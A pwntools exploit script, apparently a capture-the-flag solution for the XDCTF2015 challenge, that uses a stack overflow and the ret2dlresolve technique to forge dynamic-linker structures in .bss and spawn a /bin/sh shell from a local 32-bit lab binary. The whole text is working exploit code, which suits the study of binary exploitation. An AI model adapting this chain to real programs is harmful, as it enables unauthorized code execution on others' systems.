from pwn import *
context(arch='i386', os='linux', log_level='debug')
p	= process('./main_partial_relro_32')
elf	= ELF('./main_partial_relro_32')

dl			= 0x08048370
STRTAB		= 0x0804826C
SYMTAB		= 0x080481CC
JMPREL		= 0x08048324

bss_addr	= elf.bss()
read_plt	= elf.plt['read']
vuln_addr	= elf.symbols['vuln']
strlen_plt	= elf.plt['strlen']
strlen_got	= elf.got['strlen']

p.recvuntil('Welcome to XDCTF2015~!\n')

# 需要在bss段写入的数据
payload	= p32(strlen_got) + p32((int((bss_addr + 0x34 - SYMTAB) / 0x10) << 8) | 0x07)								# 伪造JMPREL
payload	+= b'a' * (0x34 - 8) + p32(bss_addr + 0x34 + 0x10 - STRTAB) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)	# 伪造SYMTAB
payload	+= b'system\x00/bin/sh\x00'																					# system和/bin/sh字符串

# 往bss中写入伪造数据
p.send(b'a' * 112 + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(len(payload)))
p.send(payload)

# 调用strlen的plt的第二部分去重定向strlen
p.send(b'a' * 112 + p32(dl) + p32(bss_addr - JMPREL) + p32(vuln_addr) + p32(bss_addr + 0x34 + 0x10 + 0x7))

p.interactive()